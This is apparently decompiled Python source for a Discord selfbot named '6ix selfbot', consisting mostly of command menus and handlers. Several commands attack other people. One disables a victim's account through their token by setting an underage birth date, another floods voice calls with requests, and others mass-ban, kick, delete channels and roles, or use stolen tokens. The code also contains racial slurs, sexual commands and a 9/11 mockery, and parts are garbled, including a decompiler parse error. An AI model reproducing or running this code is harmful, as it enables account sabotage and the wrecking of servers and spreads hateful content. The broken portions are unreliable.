    em.add_field(name='`𝐚𝐬𝐜𝐢𝐢 `', value='Makes your message ascii/fancy', inline=False)
    em.add_field(name='`𝐫𝐞𝐚𝐝`', value='Marks all your messages as read, except DM', inline=False)
    em.add_field(name='`𝐠𝐫𝐨𝐮𝐩-𝐥𝐞𝐚𝐯𝐞𝐫`', value="Leaves all the groups you're in", inline=False)
    em.add_field(name='`𝐩𝐮𝐫𝐠𝐞`', value='Deletes your messages based on the amount you specify', inline=False)
    em.add_field(name='`𝐮𝐩𝐭𝐢𝐦𝐞`', value='Shows how long the selfbot has been online and working', inline=False)
    em.add_field(name='`𝐡𝐚𝐬𝐭𝐞𝐛𝐢𝐧`', value='Saves your text/code to hastebin', inline=False)
    em.add_field(name='`𝐟𝐢𝐫𝐬𝐭-𝐦𝐞𝐬𝐬𝐚𝐠𝐞`', value='Get the first message in that channel', inline=False)
    em.add_field(name='`𝐚𝐛𝐜`', value='Sends the whole abecedary in a single message', inline=False)
    em.add_field(name='`𝐝𝐞𝐯𝐨𝐰𝐞𝐥`', value='Devowels your message', inline=False)
    em.add_field(name='`𝟏𝟑𝟑𝟕-𝐬𝐩𝐞𝐚𝐤`', value='Translates your message to 1337 language', inline=False)
    em.add_field(name='`𝐜𝐨𝐦𝐛𝐢𝐧𝐞 (name1) (name2)`', value='Combines the two names together', inline=False)
    em.add_field(name='`𝐩𝐢𝐧𝐠𝐰𝐞𝐛`', value='Pings a website in order to check if its working or not (ie: !pingweb https://google.com)', inline=False)
    em.add_field(name='`𝐬𝐩𝐚𝐦 (amount) (message)`', value='Sends the specified message that amount of times', inline=False)
    em.add_field(name='`𝐜𝐥𝐞𝐚𝐫`', value='Spam the chat with invisible messages', inline=False)
    em.add_field(name='`𝐭𝐭𝐬`', value='Send that message in .wav format, like an audio', inline=False)
    em.add_field(name='`𝐮𝐩𝐩𝐞𝐫`', value='Make your message CAPS', inline=False)
    em.add_field(name='`𝐠𝐞𝐧𝐧𝐚𝐦𝐞`', value='Generate a random name based on the server members', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def nsfw(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='1̶8̶+̶ ', description='', color=0)
    em.set_author(name='𝐆𝐈𝐅')
    em.add_field(name='`lesbian`', value='Lesbian sex with ur fav person', inline=False)
    em.add_field(name='`head`', value='Head OwO', inline=False)
    em.add_field(name='`boobs`', value='Plays with the vitcims boobs', inline=False)
    em.add_field(name='`fuck`', value='Fucks the person you ping', inline=False)
    em.add_field(name='`anal`', value='Does anal with who ever you ping', inline=False)
    em.add_field(name='`feed`', value='Feed the mentioned user', inline=False)
    em.add_field(name='`pokes`', value='pokes ur hubby or fwend', inline=False)
    em.add_field(name='`tickle`', value='Tickle the mentioned user', inline=False)
    em.add_field(name='`hug`', value='give big hugs', inline=False)
    em.add_field(name='`slap`', value='Slap dat hoe', inline=False)
    em.add_field(name='`smug`', value="kinda weird I don't use it personally.", inline=False)
    em.add_field(name='`pat`', value='Pat em cuz dey good', inline=False)
    em.add_field(name='`kiss`', value='issa kith duh..', inline=False)
    em.add_field(name='`cum`', value='cum inside them OwO', inline=False)
    em.add_field(name='`cuddle`', value='cuddle with ur fav person', inline=False)
    em.add_field(name='`head`', value='give head UwU', inline=False)
    em.add_field(name='`kill`', value='kills the person you mention', inline=False)
    em.add_field(name='`lick`', value='licks the perons you mention', inline=False)
    em.add_field(name='`sex`', value='have sex with ur fav perons', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def amc(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='F̶O̶R̶ ̶Y̶O̶U̶R̶ ̶A̶C̶C̶O̶U̶N̶T̶', description='', color=0)
    em.set_author(name='𝐀𝐌𝐂')
    em.add_field(name='`setpfp`', value='Set the specified url as profile picture', inline=False)
    em.add_field(name='`btcstream`', value='Stream current btc price', inline=False)
    em.add_field(name='`pfpsteal`', value='Allows you to steal mentioned user profile picture', inline=False)
    em.add_field(name='`blank`', value='Turns your name and profile picture blank', inline=False)
    em.add_field(name='`hypesquad`', value='Allows you to change your hypesquad (ie: !hypesquad bravery)', inline=False)
    em.add_field(name='`fakenet`', value='Allows you to spoof connections in your profile (ie: !fakenet skype 6ix)', inline=False)
    em.add_field(name='`steal-all-pfp`', value='ion gotta explain -_-', inline=False)
    em.add_field(name='`𝐬etS`', value='add a stream status', inline=False)
    em.add_field(name='`setG`', value='add a playing status', inline=False)
    em.add_field(name='`setL`', value='add a listening status', inline=False)
    em.add_field(name='`embedsay`', value='sends a message as embed', inline=False)
    em.add_field(name='`ping`', value='your ping', inline=False)
    em.add_field(name='`setW`', value='add a watching status', inline=False)
    em.add_field(name='`rnick`', value='make your nickname look cool..?', inline=False)
    em.add_field(name='`stopnick`', value='stopsrnick', inline=False)
    em.add_field(name='`cbomb`', value='crash vc only works on Dm or Gc', inline=False)
    em.add_field(name='`Afk on or Afk off`', value='Afk Cmd', inline=False)
    em.add_field(name='`prefix`', value='changes the prefix', inline=False)
    em.add_field(name='`dlogger on/off`', value='message logger', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def fun(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='F̶U̶N̶ ̶C̶O̶M̶M̶A̶N̶D̶', description='', color=0)
    em.set_author(name='𝐅𝐔𝐍')
    em.add_field(name='`fox`', value='Random fox image', inline=False)
    em.add_field(name='`bomb`', value='sends a bomb', inline=False)
    em.add_field(name='`fuckyou`', value='fuckyou messafe', inline=False)
    em.add_field(name='`dog`', value='Random dog image', inline=False)
    em.add_field(name='`cashapp`', value='cashapp.', inline=False)
    em.add_field(name='`paypal`', value='PayPal..', inline=False)
    em.add_field(name='`cums`', value="I don't gotta explain", inline=False)
    em.add_field(name='`9/11`', value='9/11 attack', inline=False)
    em.add_field(name='`cat`', value='Random cat image', inline=False)
    em.add_field(name='`minesweeper`', value='Play minesweeper in the discord chat', inline=False)
    em.add_field(name='`rainbow`', value="Doesn't work for now Pix will fix it soon", inline=False)
    em.add_field(name='`8ball`', value='Answers your question', inline=False)
    em.add_field(name='`joke`', value='Drops a random joke in the chat', inline=False)
    em.add_field(name='`slot`', value='Play slot machine in the discord chat', inline=False)
    em.add_field(name='`topic`', value='Start a random topic to keep the chat going', inline=False)
    em.add_field(name='`wyr`', value="Start a 'what would you rather' topic in the chat", inline=False)
    em.add_field(name='`hack`', value='ping the user and troll them', inline=False)
    em.add_field(name='`wizz`', value='say it in servers and troll them', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def util(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='F̶O̶R̶ ̶S̶E̶R̶V̶E̶R̶', description='', color=0)
    em.set_author(name='𝐔𝐓𝐈𝐋')
    em.add_field(name='`bitly`', value='Shorten ur link using bitly [Must have bitly api key set in config.json file]', inline=False)
    em.add_field(name='`tinyurl`', value='Shorten ur link using tinyurl', inline=False)
    em.add_field(name='`backup-f`', value='Backup your friends name and discrim', inline=False)
    em.add_field(name='`auto-bump`', value='Automatically bump server to disboard.org [serversonly]', inline=False)
    em.add_field(name='`mac`', value='Lookup a bit of info about a MAC (ie: !mac xx:xx:xx:xx:xx:xx)', inline=False)
    em.add_field(name='`copy`', value='Copies guild channels, categories, voice channels and makes them in a new one', inline=False)
    em.add_field(name='`encode`', value='Encode a string to base64 ascii', inline=False)
    em.add_field(name='`decode`', value='Decode a string from base64 to regular text', inline=False)
    em.add_field(name='`eth`', value='Display current Ethereum price', inline=False)
    em.add_field(name='`btc`', value='Display current Bitcoin price', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def hacking(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='H̶A̶C̶K̶I̶N̶G̶ ̶C̶O̶M̶M̶A̶N̶D̶', description='', color=0)
    em.set_author(name='𝐇𝐀𝐂𝐊𝐈𝐍𝐆')
    em.add_field(name='`tokeninfo`', value='Display various information about the token', inline=False)
    em.add_field(name='`tokenfuck`', value='Crash, glitch screen of a token, all in discord', inline=False)
    em.add_field(name='`ip`', value='Display various information about the IP', inline=False)
    em.add_field(name='`gmail-bomb`', value='Spam a gmail [When you run it look in console]', inline=False)
    em.add_field(name='`nitro`', value='Generate a random nitro code', inline=False)
    em.add_field(name='`address(text)`', value='Generates fake address based on the text you specify', inline=False)
    em.add_field(name='`masslogin`', value='Allows you to mass-login in bot/user tokens [Choices can be: user and bot]', inline=False)
    em.add_field(name='`login`', value='Allows you to mass-login in bot/user tokens [Choices can be: user and bot]', inline=False)
    em.add_field(name='`botlogin`', value='Allows you to mass-login in bot/user tokens [Choices can be: user and bot]', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def wizzing(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='S̶E̶R̶V̶E̶R̶ ̶W̶I̶Z̶Z̶', description='', color=0)
    em.set_author(name='𝐖𝐈𝐙𝐙𝐈𝐍𝐆')
    em.add_field(name='`𝐒𝐈𝐗`', value='Shits on the server', inline=False)
    em.add_field(name='`𝐝𝐦𝐚𝐥𝐥`', value='10 second cooldown but u might get disabled', inline=False)
    em.add_field(name='`𝐦𝐚𝐬𝐬𝐁`', value='Ban all the users in that guild', inline=False)
    em.add_field(name='`𝐦𝐚𝐬𝐬𝐊`', value='Kick all the users in that guild', inline=False)
    em.add_field(name='`𝐦𝐚𝐬𝐬𝐑`', value='Mass create roles', inline=False)
    em.add_field(name='`𝐦𝐚𝐬𝐬𝐂`', value='Mass create channels', inline=False)
    em.add_field(name='`𝐧𝐮𝐤𝐞`', value='nukes the chat', inline=False)
    em.add_field(name='`𝐝𝐞𝐥𝐑`', value='Delete all the roles', inline=False)
    em.add_field(name='`𝐝𝐞𝐥𝐂`', value='Delete all the channels', inline=False)
    em.add_field(name='`𝐦𝐚𝐬𝐬𝐔𝐧`', value='Unban every member', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def valid(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='6̶i̶x̶ ̶o̶n̶ ̶t̶o̶p̶', description='', color=0)
    em.set_author(name='𝐕𝐀𝐋𝐈𝐃 𝟔𝐈𝐗 𝐌𝐄𝐌𝐁𝐄𝐑𝐒')
    em.add_field(name='`1. Pix (inactive currently)`', value='Founder', inline=False)
    em.add_field(name='`2. Lvngo`', value='Owner', inline=False)
    em.add_field(name='`3. TEC (Og 3/6tacey)`', value='Owner', inline=False)
    em.add_field(name='`4. Xavier (xusky/suu)`', value='Owner', inline=False)
    em.add_field(name='`5. Jr (5)`', value='Owner', inline=False)
    em.add_field(name='`7. Yusky (Gloxx)`', value='Valid member', inline=False)
    em.add_field(name='`8. Samito`', value='Valid member', inline=False)
    em.add_field(name='`9. Zek`', value='Valid member', inline=False)
    em.add_field(name='`10. Fuu`', value='Valid member', inline=False)
    em.add_field(name='`11 jamir (6)`', value='Valid member', inline=False)
    em.add_field(name='`12. 90`', value='Valid member', inline=False)
    em.add_field(name='`13. Aj (02)`', value='Valid member', inline=False)
    em.add_field(name='`14. Jason (8tacey)`', value='Valid member', inline=False)
    em.add_field(name='`15. Vito`', value='Valid member', inline=False)
    em.add_field(name='`16. Flacko`', value='Valid member', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def math(ctx):
    await ctx.message.delete()
    em = discord.Embed(title='M̶A̶T̶H̶ ̶T̶O̶O̶L̶S̶', description='', color=0)
    em.set_author(name='math on top LOL XD')
    em.add_field(name='add <X Y>', value='**Gives the addition answer of *X* and *Y* **', inline=False)
    em.add_field(name='subtract <X Y>', value='**Gives the subtraction answer of *X* and *Y* **', inline=False)
    em.add_field(name='multiply <X Y>', value='**Gives the multiplication answer of *X* and *Y* **', inline=False)
    em.add_field(name='divide <X Y>', value='**Gives the division answer of *X* and *Y* **', inline=False)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command(aliases=['spamchangegcname', 'changegcname'])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = '6IXONTOP'
        name = ''
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@SIX.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=(ctx.guild.name))
    em.set_image(url=(ctx.guild.banner_url))
    await ctx.send(embed=em)


@SIX.command(aliases=['nitrosniper', '6ixnitrosniper'])
async def nitroon(ctx, param=None):
    await ctx.message.delete()
    em = discord.Embed(description='', color=255)
    em.add_field(name='Nitro Mode', value='**Nitro Mode is on ready to snipe!**', inline=False)
    em.set_image(url='https://thumbs.gfycat.com/BlaringPointedInvisiblerail-size_restricted.gif')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)
    SIX.nitro_sniper = False
    if str(param).lower() == 'true' or (str(param).lower() == 'on'):
        SIX.nitro_sniper = True


@SIX.command(aliases=['nitro_sniper', '6ixnitro_sniper'])
async def nitrooff(ctx, param=None):
    await ctx.message.delete()
    em = discord.Embed(description='', color=255)
    em.add_field(name='Nitro Mode Off', value='**Nitro Mode is Off You will not snipe any nitro!**', inline=False)
    em.set_image(url='https://thumbs.gfycat.com/BlaringPointedInvisiblerail-size_restricted.gif')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def boost(ctx, param=None):
    await ctx.message.delete()
    em = discord.Embed(description='', color=8388736)
    em.add_field(name='I Boost The server give me admin now nigger', value='**You boosted the server 600 times.**', inline=False)
    em.set_image(url='https://media1.tenor.com/images/33e617e91d27dc7743b80baab0ab24be/tenor.gif?itemid=17398531')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    await ctx.send(embed=em)


@SIX.command()
async def shrug(ctx):
    await ctx.message.edit(content='¯\\\\_(ツ)\\_/¯')


@SIX.command()
async def cbomb(ctx):
    await ctx.message.delete()
    latency = 0
    choices = ['brazil', 'europe', 'frankfurt', 'hong-kong', 'india', 'japan', 'russia', 'singapore', 'south-africa', 'sydney', 'us-central', 'us-east', 'us-south', 'us-west', 'amsterdam']
    headers = {'authorization':token, 
     'referer':'https://discordapp.com/channels/@me/' + str(ctx.message.channel.id), 
     'accept-encoding':'gzip, deflate, br', 
     'origin':'https://discordapp.com/'}
    url = 'https://discordapp.com/api/v6/channels/' + str(ctx.message.channel.id) + '/call'
    t_end = time.time() + 10
    while True:
        if time.time() < t_end:
            x = random.choice(choices)
            payload = {'region': x}
            r = requests.patch(url, headers=headers, json=payload)
            if r.status_code != 204:
                print('[#] Being ratelimited, applying 100ms latency')
                latency += 0.1
                time.sleep(latency)
            time.sleep(latency)


@SIX.command(pass_context=True, aliases=['cyclename', 'autoname', 'autonick', 'cycle'])
async def rnick(ctx, *, text):
    global cycling
    await ctx.message.delete()
    cycling = True
    while cycling:
        name = ''
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@SIX.command(aliases=['stopcyclename', 'cyclestop', 'stopautoname', 'stopautonick', 'stopcycle'])
async def stoprnick(ctx):
    global cycling
    await ctx.message.delete()
    cycling = False


@SIX.command()
async def multiply(ctx, a: int, b: int):
    await ctx.message.delete()
    await ctx.send(a * b)


@SIX.command()
async def add(ctx, a: int, b: int):
    await ctx.message.delete()
    await ctx.send(a + b)


@SIX.command()
async def divide(ctx, a: int, b: int):
    await ctx.message.delete()
    await ctx.send(a / b)


@SIX.command()
async def subtract(ctx, a: int, b: int):
    await ctx.message.delete()
    await ctx.send(a - b)


@SIX.command()
async def tokengen(ctx):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://some-random-api.ml/bottoken') as r:
            if r.status == 200:
                js = await r.json()
                token = js['token']
                await ctx.message.delete()
        await ctx.send('discord\n' + token + '\n')


@SIX.command()
async def bomb(ctx):
    await ctx.message.edit(content=':bomb: ---------------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: --------------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: -------------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ------------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ------------ :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ----------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ---------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: --------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: -------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ------- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ------ :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ----- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: ---- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: --- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: -- :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb: - :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':bomb:  :fire:')
    time.sleep(1)
    await ctx.message.edit(content=':boom: ** BOOM!!! **')


@SIX.command()
async def fuckyou(ctx):
    await ctx.message.edit(content='F')
    time.sleep(0.1)
    await ctx.message.edit(content='FU')
    time.sleep(0.1)
    await ctx.message.edit(content='FUC')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK ')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK Y')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YO')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU ')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU N')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU NI')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU NIG')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU NIGG')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU NIGGA')
    time.sleep(0.1)
    await ctx.message.edit(content='FUCK YOU NIGGA')


@SIX.command(aliases=['jerkoff', 'ejaculate', 'orgasm'])
async def cums(ctx):
    await ctx.message.delete()
    message = await ctx.send('\n            :ok_hand:            :smile:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant:')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                      :ok_hand:            :smiley:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:  \n     ')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                      :ok_hand:            :grimacing:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant:  \n     ')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                      :ok_hand:            :persevere:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:   \n     ')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                      :ok_hand:            :confounded:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant: \n     ')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                       :ok_hand:            :tired_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:    \n             ')
    await asyncio.sleep(0.5)
    await message.edit(contnet='\n                       :ok_hand:            :weary:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:= D:sweat_drops:\n             :trumpet:      :eggplant:        \n     ')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                       :ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D :sweat_drops:\n             :trumpet:      :eggplant:                 :sweat_drops:\n     ')
    await asyncio.sleep(0.5)
    await message.edit(content='\n                       :ok_hand:            :drooling_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D :sweat_drops:\n             :trumpet:      :eggplant:                 :sweat_drops:\n     ')


@SIX.command(aliases=['9/11', '911', 'terrorist'])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ''
    message = await ctx.send(f"\n{invis}:man_wearing_turban::airplane:    :office:           \n")
    await asyncio.sleep(0.5)
    await message.edit(content=f"\n{invis} :man_wearing_turban::airplane:   :office:           \n")
    await asyncio.sleep(0.5)
    await message.edit(content=f"\n{invis}  :man_wearing_turban::airplane:  :office:           \n")
    await asyncio.sleep(0.5)
    await message.edit(content=f"\n{invis}   :man_wearing_turban::airplane: :office:           \n")
    await asyncio.sleep(0.5)
    await message.edit(content=f"\n{invis}    :man_wearing_turban::airplane::office:           \n")
    await asyncio.sleep(0.5)
    await message.edit(content='\n        :boom::boom::boom:    \n        ')


@SIX.command()
async def nuke(ctx, amount=1):
    await ctx.channel.purge(limit=10000)
    await ctx.send('Channel nuked')
    await ctx.send('https://imgur.com/LIyGeCR')


@SIX.command()
async def ping(ctx):
    await ctx.message.edit(content=f"`{round(SIX.latency * 1000)}ms`")


@SIX.command()
async def pings(ctx):
    await ctx.message.delete()
    em = discord.Embed(description=f"Your Ping: `{round(SIX.latency * 1000)}ms`")
    em.set_author(name='Ping', icon_url='https://pluspng.com/img-png/wifi-png-black-and-white-wi-fi-icon-if-you-were-to-take-a-circle-and-then-surround-it-png-50-px-1600.png')
    await ctx.send(embed=em)


@SIX.command()
async def embedsay(ctx, text):
    await ctx.message.delete()
    em = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
    em.description = text
    await ctx.send(embed=em)


@SIX.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    SIX.command_prefix = str(prefix)


SIX.command(pass_context=True)

async def paypal(beaters, amount: int):
    embed = discord.Embed(title='Paypal :heart:', color=0)
    embed.add_field(name='`Email:`', value=(f"{paypalemail}"), inline=False)
    embed.add_field(name='`Amount:`', value=amount, inline=False)
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/678697731786670101/707231627897733120/1Pdw2RE.png')
    embed.set_footer(text='6ix Selfbot <3', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await beaters.send(embed=embed)
    await beaters.message.delete()


@SIX.command(pass_context=True)
async def cashapp(beaters, amount: int):
    embed = discord.Embed(title='CashApp :heart:', color=0)
    embed.add_field(name='`Email:`', value=(f"{cashappemail}"), inline=False)
    embed.add_field(name='`Amount:`', value=amount, inline=False)
    embed.set_thumbnail(url='https://www.thebalance.com/thmb/pJiqowKcHb0U5GF72aclAdzEjWM=/865x844/filters:no_upscale():max_bytes(150000):strip_icc()/SquareCash-5a85986cc5542e003729ccb7.png')
    embed.set_footer(text='6ix Selfbot <3', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await beaters.send(embed=embed)
    await beaters.message.delete()


@SIX.command()
async def tokenban(ctx, _token):
    await ctx.message.delete()
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': _token}, json={'date_of_birth': '2017-7-16'})
    if r.status_code == 400:
        await ctx.send('`Account disabled. pussy ass nigga`')
        print(f"[{Fore.RED}+{Fore.RESET}] Account disabled successfully")
    else:
        await ctx.send('`Invalid token nigga`')


def RED():
    RED = discord.Color(random.randint(16711883, 16711883))
    return RED


@SIX.command(aliases=['rc'])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@SIX.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Exeter.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()


@SIX.command()
async def massdmall--- This code section failed: ---

 L.1291         0  LOAD_GLOBAL              list
                2  LOAD_FAST                'ctx'
                4  LOAD_ATTR                guild
                6  LOAD_ATTR                members
                8  CALL_FUNCTION_1       1  ''
               10  GET_ITER         
             12_0  COME_FROM            94  '94'
             12_1  COME_FROM            90  '90'
             12_2  COME_FROM            80  '80'
               12  FOR_ITER             96  'to 96'
               14  STORE_FAST               'user'

 L.1292        16  SETUP_FINALLY        82  'to 82'

 L.1293        18  LOAD_GLOBAL              asyncio
               20  LOAD_METHOD              sleep
               22  LOAD_CONST               0.5
               24  CALL_METHOD_1         1  ''
               26  GET_AWAITABLE    
               28  LOAD_CONST               None
               30  YIELD_FROM       
               32  POP_TOP          

 L.1294        34  LOAD_FAST                'user'
               36  LOAD_METHOD              send
               38  LOAD_FAST                'message'
               40  CALL_METHOD_1         1  ''
               42  GET_AWAITABLE    
               44  LOAD_CONST               None
               46  YIELD_FROM       
               48  POP_TOP          

 L.1295        50  LOAD_FAST                'ctx'
               52  LOAD_METHOD              send
               54  LOAD_STR                 'Sent "'
               56  LOAD_FAST                'message'
               58  FORMAT_VALUE          0  ''
               60  LOAD_STR                 '" To '
               62  LOAD_FAST                'user'
               64  FORMAT_VALUE          0  ''
               66  BUILD_STRING_4        4 
               68  CALL_METHOD_1         1  ''
               70  GET_AWAITABLE    
               72  LOAD_CONST               None
               74  YIELD_FROM       
               76  POP_TOP          
               78  POP_BLOCK        
               80  JUMP_BACK            12  'to 12'
             82_0  COME_FROM_FINALLY    16  '16'

 L.1296        82  POP_TOP          
               84  POP_TOP          
               86  POP_TOP          

 L.1297        88  POP_EXCEPT       
               90  JUMP_BACK            12  'to 12'
               92  END_FINALLY      
               94  JUMP_BACK            12  'to 12'
             96_0  COME_FROM            12  '12'

Parse error at or near `JUMP_BACK' instruction at offset 90


@SIX.command(pass_context=True)
async def info(beaters, member: discord.Member=None):
    embed = discord.Embed(title='User Info <3', color=0)
    embed.add_field(name='`User ID:`', value=(member.id), inline=False)
    embed.add_field(name='`Name:`', value=(member.display_name), inline=False)
    embed.add_field(name='`Creation Date:`', value=(member.created_at.strftime('%a, %d %B %Y, %I:%M %p')), inline=False)
    embed.add_field(name='`Bot Check`', value=(member.bot), inline=False)
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_footer(text='6ix Selfbot <3', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await beaters.send(embed=embed)
    await beaters.message.delete()


@SIX.command(pass_context=True)
async def cfres(beaters, domain):
    cfpage = 'https://webresolver.nl/api.php?key=HV3WS-KA7N9-WNASK-ZFUYL&html=0&action=cloudflare&string=' + domain
    resp = requests.get(cfpage)
    embed = discord.Embed(title='CloudFlare Resolver', description=(f"{resp.text}"), color=0)
    embed.set_footer(text='6ix Selfbot <3', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await beaters.send(embed=embed)
    await beaters.message.delete()


@SIX.command(pass_context=True)
async def vpn(beaters):
    embed = discord.Embed(title='6ixSec VPN Plans', description='```SixSec Is A VPN Company That Cares Fully About Your Privacy We Are Here To Stop DDoS Attack With Our Anti-DDoS Protection And Our Custom Firewalls, We Provide A No Log Policy We Provide Locations That Fit You Best For Gaming Or Web Surfing, We Are Constantly Updating Our Firewalls To Block New DDoS Attack Methods.```', color=0)
    embed.add_field(name='__Prices__', value='``Contact Me Or Kills For Special Plan``', inline=False)
    embed.add_field(name='`1 Month`', value='**$10.**', inline=False)
    embed.add_field(name='`3 Months`', value='**$25.**', inline=False)
    embed.add_field(name='`Reseller`', value='**$35. Split Money 50/50**', inline=False)
    embed.add_field(name='`Lifetime`', value='**$100.**', inline=False)
    embed.add_field(name='__Payment Options__', value='``We Accept, Paypal,Cashapp,Venmo.``', inline=False)
